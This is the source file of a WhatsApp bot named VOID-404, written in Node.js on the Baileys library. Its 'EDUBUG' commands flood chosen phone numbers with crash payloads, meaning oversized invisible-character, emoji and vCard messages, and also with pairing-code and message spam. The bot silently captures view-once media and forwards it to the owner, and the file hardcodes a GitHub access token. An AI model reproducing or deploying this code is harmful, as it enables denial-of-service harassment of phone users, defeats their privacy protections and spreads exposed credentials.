const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    fetchLatestBaileysVersion, 
    DisconnectReason,
    downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const express = require("express");
const app = express();
const port = process.env.PORT || 3000;

// --- CONFIGURATION ---
const ownerNumber = "94742271802@s.whatsapp.net"; 
const GITHUB_TOKEN = "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"; 
const GITHUB_REPO = "btest2619-sudo/Database-Md";
const SESSION_BRANCH = "session-data";
const botNameAr = "تشالاه فويد ٤٠٤";
const logoUrl = 'https://files.catbox.moe/90yqxb.png';
const GEMINI_API_KEY = "YOUR_GEMINI_API_KEY"; 

let bannedUsers = [];
let workMode = "public"; 
const startTime = Date.now();
const msgCount = {}; 

// --- GITHUB SYNC ENGINE ---
async function uploadToGitHub(filePath, content) {
    try {
        const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
        let sha = null;
        try {
            const existing = await axios.get(url, {
                headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Accept': 'application/vnd.github.v3+json' },
                params: { ref: SESSION_BRANCH }
            });
            sha = existing.data.sha;
        } catch (err) {}
        const data = {
            message: `Update ${filePath}`,
            content: Buffer.from(content).toString('base64'),
            branch: SESSION_BRANCH
        };
        if (sha) data.sha = sha;
        await axios.put(url, data, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Accept': 'application/vnd.github.v3+json' }
        });
    } catch (err) {}
}

async function loadSessionFromGitHub() {
    try {
        const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/session`;
        const response = await axios.get(url, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Accept': 'application/vnd.github.v3+json' },
            params: { ref: SESSION_BRANCH }
        });
        if (!fs.existsSync('./session')) fs.mkdirSync('./session', { recursive: true });
        for (const file of response.data) {
            if (file.type === 'file') {
                const res = await axios.get(file.download_url);
                fs.writeFileSync(`./session/${file.name}`, typeof res.data === 'object' ? JSON.stringify(res.data) : res.data);
            }
        }
    } catch (err) { console.log("ℹ️ Starting New Session."); }
}

async function syncSessionToGitHub() {
    const sessionPath = './session';
    if (!fs.existsSync(sessionPath)) return;
    const files = fs.readdirSync(sessionPath);
    for (const file of files) {
        const filePath = path.join(sessionPath, file);
        if (fs.statSync(filePath).isFile()) {
            const content = fs.readFileSync(filePath, 'utf-8');
            await uploadToGitHub(`session/${file}`, content);
        }
    }
}

// --- MAIN ENGINE ---
async function startVoidBot() {
    await loadSessionFromGitHub();
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();
    
    const client = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["VOID-404", "Chrome", "20.0.04"],
        markOnlineOnConnect: true
    });

    // --- WEB ROUTES (Cannot Get Error විසඳුම) ---
    app.get('/', (req, res) => {
        res.sendFile(path.join(__dirname, 'public', 'index.html'));
    });

    app.get('/pair', async (req, res) => {
        const num = req.query.number;
        if (!num) return res.json({ error: "No number provided" });
        try {
            let code = await client.requestPairingCode(num.replace(/[^0-9]/g, ''));
            res.json({ code: code });
        } catch (e) { res.json({ error: "Pairing failed" }); }
    });

    setInterval(async () => {
        const time = new Date().toLocaleTimeString('en-US', { timeZone: 'Asia/Colombo' });
        await client.updateProfileStatus(`${botNameAr} | 🕒 ${time} | ⚡ God Mode Active`);
    }, 60000);

    client.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "open") {
            const welcomeText = `
*شكراً لاستخدامك نظام تشالاه فويد ٤٠٤* ⚡

تم تفعيل النظام بنجاح وتوصيله بخوادمنا المشفرة. استعد للسيطرة الكاملة والوصول إلى أقصى إمكانيات الأتمتة.

📡 *الحالة:* متصل (Online)
🔐 *التشفير:* نشط (AES-256)
♻️ *Backup:* GitHub Synced

_© 2026 VOID-404 PROJECT_`;
            
            await client.sendMessage(client.user.id, { image: { url: logoUrl }, caption: welcomeText });
            await syncSessionToGitHub();
            console.log("✅ VOID-404 CONNECTED");
        }
        if (connection === "close") {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) startVoidBot();
        }
    });

    client.ev.on("messages.upsert", async (chatUpdate) => {
        const m = chatUpdate.messages[0];
        if (!m.message || m.key.fromMe) return;
        
        const from = m.key.remoteJid;
        const sender = m.key.participant || m.key.remoteJid;
        const isOwner = sender.includes(ownerNumber.split('@')[0]);
        const body = m.message.conversation || m.message.extendedTextMessage?.text || "";
        const isGroup = from.endsWith('@g.us');
        const prefix = ".";
        const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : undefined;
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(" ");

        if (from === 'status@broadcast') {
            await client.readMessages([m.key]);
            await client.sendMessage(from, { react: { text: "❤️", key: m.key } }, { statusJidList: [m.key.participant] });
        }

        if (!isOwner) {
            msgCount[sender] = (msgCount[sender] || 0) + 1;
            if (msgCount[sender] > 6) return; 
            setTimeout(() => { msgCount[sender] = 0; }, 5000);
        }

        if (bannedUsers.includes(sender.split('@')[0])) return;
        if (workMode === "private" && !isOwner) return;

        await client.sendPresenceUpdate('composing', from); 
        await client.sendMessage(from, { react: { text: "👁️‍🗨️", key: m.key } }); 

        if (m.message.viewOnceMessageV2) {
            const msg = m.message.viewOnceMessageV2.message;
            const type = Object.keys(msg)[0];
            const media = await downloadContentFromMessage(msg[type], type.replace('Message', ''));
            let buffer = Buffer.from([]);
            for await (const chunk of media) buffer = Buffer.concat([buffer, chunk]);
            await client.sendMessage(ownerNumber, { [type.replace('Message', '')]: buffer, caption: `⚠️ *VIEW ONCE CAPTURED*` });
        }

        if (!command && !isGroup && body.length > 2 && GEMINI_API_KEY !== "YOUR_GEMINI_API_KEY") {
            try {
                const aiRes = await axios.post(`https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=${GEMINI_API_KEY}`, {
                    contents: [{ parts: [{ text: `Respond as a cool AI named VOID 404: ${body}` }] }]
                });
                return m.reply(aiRes.data.candidates[0].content.parts[0].text);
            } catch (e) {}
        }

        if (!command) return;

        switch (command) {
            case 'menu':
                const menu = `
           ╔═══════════════════════════╗
           ║   تشالاه فويد ٤٠٤  ║
           ║      [ CHALAH VOID 404 ]      ║
           ╚═══════════════════════════╝
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      ⚡  A U T O M A T I O N
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      ◈ .ᴀʟɪᴠᴇ  ◈ .ᴀᴜᴛۆᴛʏᴘᴇ  ◈ .ᴀᴜᴛۆʀᴇᴀᴄᴛ
      ◈ .ᴀɪ-ɢʜۆꜱᴛ  ◈ .ᴀɴᴛɪ-ꜱᴘᴀᴍ  ◈ .ᴀɴᴛɪ-ᴠɪᴇᴡ
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      📥  D O W N L O A D E R S
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      ◈ .ᴘʟᴀʏ  ◈ .ᴠɪඩේۆ  ◈ .ᴛɪᴋᴛۆᴋ  ◈ .ꜰʙ  ◈ .ɪɢ
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      🛡️  U T I L I T I E S
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      ◈ .ꜱᴛɪᴄᴋᴇʀ  ◈ .ᴛۆɪᴍɢ  ◈ .ᴘɪɴɢ  ◈ .ᴛᴀɢᴀʟʟ
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      🔥  E D U B U G  M E N U (Education)
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      ◈ .ᴀᴜᴛۆʙᴀᴄᴋ  ◈ .ɪۆꜱᴄʀᴀꜱʜ  ◈ .ᴘᴀɪʀꜱᴘᴀᴍ
      ◈ .ᴄᴀʟʟꜱᴘᴀᴍ  ◈ .ᴄʜᴀʟᴀʜᴅᴇʟᴀʏ  ◈ .ꜱʏꜱᴛᴇᴍᴄʀᴀꜱʜ
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      🔱  O W N E R  M O D S
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
      ◈ .ʙᴀɴ  ◈ .ᴜɴʙᴀɴ  ◈ .ᴘʀɪᴠᴀᴛᴇ  ◈ .ʙۆᴛ (ᴘᴀɪʀ)`;
                await client.sendMessage(from, { image: { url: logoUrl }, caption: menu });
                break;

            case 'alive':
                const rS = Math.floor((Date.now() - startTime) / 1000);
                m.reply(`*VOID 404 ONLINE*\n⏱️ Runtime: ${Math.floor(rS/3600)}h ${Math.floor((rS%3600)/60)}m\n📡 System: AES-256`);
                break;

            case 'systemcrash':
                if (!isOwner) return;
                const targetSys = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                m.reply("💀 Injecting Ultra System Payload... Target may lose access.");
                const crashPayload = "‌".repeat(5000) + "⚰️".repeat(2000) + "endᚵ".repeat(1000);
                for (let i = 0; i < 15; i++) {
                    await client.sendMessage(targetSys, { 
                        text: crashPayload,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "VOID-404 SYSTEM ERROR", 
                                body: "CRITICAL FAILURE", 
                                mediaType: 1, 
                                thumbnail: Buffer.from([]),
                                sourceUrl: "https://void-404.error"
                            },
                            forwardingScore: 999,
                            isForwarded: true
                        }
                    });
                    await delay(400);
                }
                break;

            case 'autoback':
                if (!isOwner) return;
                const targetAB = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                m.reply("🚀 Sending Auto-Back payload...");
                for (let i = 0; i < 10; i++) {
                    await client.sendMessage(targetAB, { text: "VOID-CRASH-".repeat(1500) });
                    await delay(500);
                }
                break;

            case 'ioscrash':
                if (!isOwner) return;
                const targetIOS = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                m.reply("🍎 Targeting iOS stability...");
                for (let i = 0; i < 5; i++) {
                    await client.sendMessage(targetIOS, { text: "".repeat(4000) });
                }
                break;

            case 'chalahdelay':
                if (!isOwner) return;
                const targetAndroid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                m.reply("🤖 Injecting Chalah-Delay...");
                const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:VOID-404\nTEL;type=CELL;waid=94111:+94 111\nEND:VCARD';
                for (let i = 0; i < 20; i++) {
                    await client.sendMessage(targetAndroid, { contacts: { displayName: 'VOID-DELAY', contacts: [{ vcard }] } });
                }
                break;

            case 'pairspam':
                if (!isOwner) return;
                const targetPS = q.replace(/[^0-9]/g, '');
                m.reply("🔑 Sending Pairing Notification Spam...");
                for (let i = 0; i < 15; i++) {
                    try { await client.requestPairingCode(targetPS); } catch {}
                    await delay(300);
                }
                break;

            case 'callspam':
                if (!isOwner) return;
                const targetCS = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                m.reply("📞 Call-Spam process started...");
                for (let i = 0; i < 10; i++) {
                    await client.sendMessage(targetCS, { text: "📞 Incoming secure call trace..." });
                    await delay(300);
                }
                break;

            case 'play': case 'song': if (!q) return m.reply("Enter song."); m.reply("🎵 Searching..."); break;
            case 'video': if (!q) return m.reply("Enter video."); m.reply("🎥 Downloading..."); break;
            case 'tiktok': case 'fb': case 'ig': if (!q) return m.reply("Enter link."); m.reply("📥 Processing..."); break;
            case 'ping':
                const pS = Date.now();
                await m.reply('Testing...');
                m.reply(`🎯 Speed: ${Date.now() - pS}ms`);
                break;
            case 'tagall':
                if (!isGroup) return;
                const gM = await client.groupMetadata(from);
                let txt = `📢 *TAG ALL*\n\n`;
                gM.participants.forEach(v => txt += `◈ @${v.id.split('@')[0]}\n`);
                client.sendMessage(from, { text: txt, mentions: gM.participants.map(a => a.id) });
                break;
            case 'bot':
                const tN = q.replace(/[^0-9]/g, '');
                if (!tN) return m.reply("Enter number.");
                let c = await client.requestPairingCode(tN);
                m.reply(`👉 *${c}* 👈`);
                break;
            case 'ban': if (isOwner) bannedUsers.push(q); break;
            case 'private': case 'public': workMode = command; m.reply(`Mode: ${command}`); break;
        }
    });

    client.ev.on('call', async (call) => {
        if (call[0].status === 'offer') {
            await client.rejectCall(call[0].id, call[0].from);
            await client.sendMessage(call[0].from, { text: "⚠️ *تحذير*: المكالمات محظورة." });
        }
    });

    client.ev.on("creds.update", async () => {
        await saveCreds();
        setTimeout(() => syncSessionToGitHub(), 2000);
    });
}

app.listen(port, () => console.log(`🚀 VOID-404 Running on Port: ${port}`));
startVoidBot();
